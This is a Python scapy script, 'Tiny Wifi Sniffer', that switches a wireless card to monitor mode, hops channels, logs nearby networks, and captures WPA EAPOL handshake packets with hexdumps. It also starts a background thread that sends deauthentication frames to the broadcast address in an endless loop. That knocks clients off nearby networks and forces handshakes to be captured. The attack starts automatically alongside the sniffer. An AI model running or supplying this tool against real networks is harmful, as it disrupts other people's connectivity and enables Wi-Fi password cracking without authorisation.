"""
Tiny Wifi Sniffer
works on Linux
using scapy library
by k3ssdev
"""

import os
import sys
import threading
import logging
from scapy.all import *

# Evitar que se impriman por pantalla warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


import signal

# Función para manejar la señal SIGINT (Control + C)
def signal_handler(sig, frame):
    print('\n[+] Closing Wifi Sniffer')
    sys.exit(0)
    
# Registrar el manejador de señal SIGINT
signal.signal(signal.SIGINT, signal_handler)

#Debugging
#from scapy.config import conf
#conf.debug_dissector = 2

# Control de RAM
import psutil

# definir el umbral de uso de RAM en bytes
RAM_THRESHOLD = 1000000

# variable para almacenar el uso de RAM anterior
prev_ram_usage = None


#Aumentar recursividad para evitar errores Socket <scapy.arch.linux.L2ListenSocket object at 0x7fb2bda9d0> failed with 'maximum recursion depth exceeded while calling a Python object'. It was closed.
import sys
sys.setrecursionlimit(5000)


# Configurar el registro
logging.basicConfig(filename='wifisniffer.log', level=logging.INFO,
                    format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Comprobar si se ha proporcionado un argumento para la interfaz de red
if len(sys.argv) ==  2:
    iface = str(sys.argv[1])
else:
    iface = "wlan0"

# Desactivar, establecer en modo monitor y activar la interfaz de red mediante comandos del sistema operativo
os.system("ifconfig " + iface + " down") 
os.system("iwconfig " + iface + " mode monitor")
os.system("ifconfig " + iface + " up")

# Función para extraer información relevante de un paquete y escribirla en el archivo de registro
def packet_info(pkt):
    bssid = pkt[Dot11].addr3
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    ssid, channel = None, None
    crypto = set()
    while isinstance(p, Dot11Elt):
        if p.ID == 0:
            ssid = p.info.decode(errors='ignore') # Decodificar el SSID a partir de los bytes
        elif p.ID == 3:
            channel = ord(p.info) # Convertir el número del canal a un entero
        elif p.ID == 48:
            crypto.add("WPA2")
        elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
        p = p.payload
    if not crypto:
        if 'privacy' in cap:
            crypto.add("WEP")
        else:
            crypto.add("OPN")
    logging.info(f"{ssid!r} [{bssid}], {' / '.join(crypto)}")


def handle_packet(packet):
    # Verificar si la memoria RAM actual es menor que el umbral establecido
    if psutil.virtual_memory().available < RAM_THRESHOLD:
        logging.warning("Low memory warning. Pausing sniffing...")
        time.sleep(60)

    if packet.haslayer(EAPOL):
        logging.info("EAPOL packet captured:")
        print("EAPOL packet captured:"+packet.summary())
         
        # Mostrar información del paquete
        logging.info(packet.summary())
        if packet.haslayer(Raw):
            # Si el paquete tiene una capa Raw, mostrar una vista hexadecimal de la carga útil del paquete
            logging.info("")
            logging.info(hexdump(packet.load))
            logging.info("")


# Imprimir un mensaje en la consola para indicar que se está realizando una captura en la interfaz de red especificada
print("[+] Sniffing on interface " + iface + ": ")



# Función de bucle infinito para recorrer todos los canales y capturar paquetes
def channel_sniffer():
    while True:
        for channel in range(1, 14):
            os.system("iwconfig " + iface + " channel " + str(channel)) # Establecer el canal en la interfaz de red
            logging.info("[+] Sniffing on channel " + str(channel)) # Escribir en el archivo de registro que se está realizando una captura en ese canal
            # Capturar paquetes en el canal actual y llamar a la función handle_packet para cada paquete capturado
            sniff(iface=iface, prn=handle_packet, count=100, timeout=30, store=0)

def deauth_attack():
    # Definir la dirección MAC del punto de acceso y la dirección MAC del dispositivo objetivo
    ap_mac = "ff:ff:ff:ff:ff:ff" #"00:11:22:33:44:55"
    target_mac = "ff:ff:ff:ff:ff:ff" #"AA:BB:CC:DD:EE:FF"

    # Crear el paquete de deautenticación
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()

    # Enviar el paquete en un loop infinito
    while True:
        sendp(pkt, inter=0.1, loop=1, count=10)
        time.sleep(30)

# Crear un nuevo hilo para ejecutar la función deautenticación como demonio
deauth_thread = threading.Thread(target=deauth_attack)
deauth_thread.daemon = True

# Crear un nuevo hilo para ejecutar la función channel_hopper como demonio
sniffer_thread = threading.Thread(target=channel_sniffer)
sniffer_thread.daemon = True

# Iniciar los hilos
deauth_thread.start()
sniffer_thread.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    print('\\n[+] Closing Wifi Sniffer...')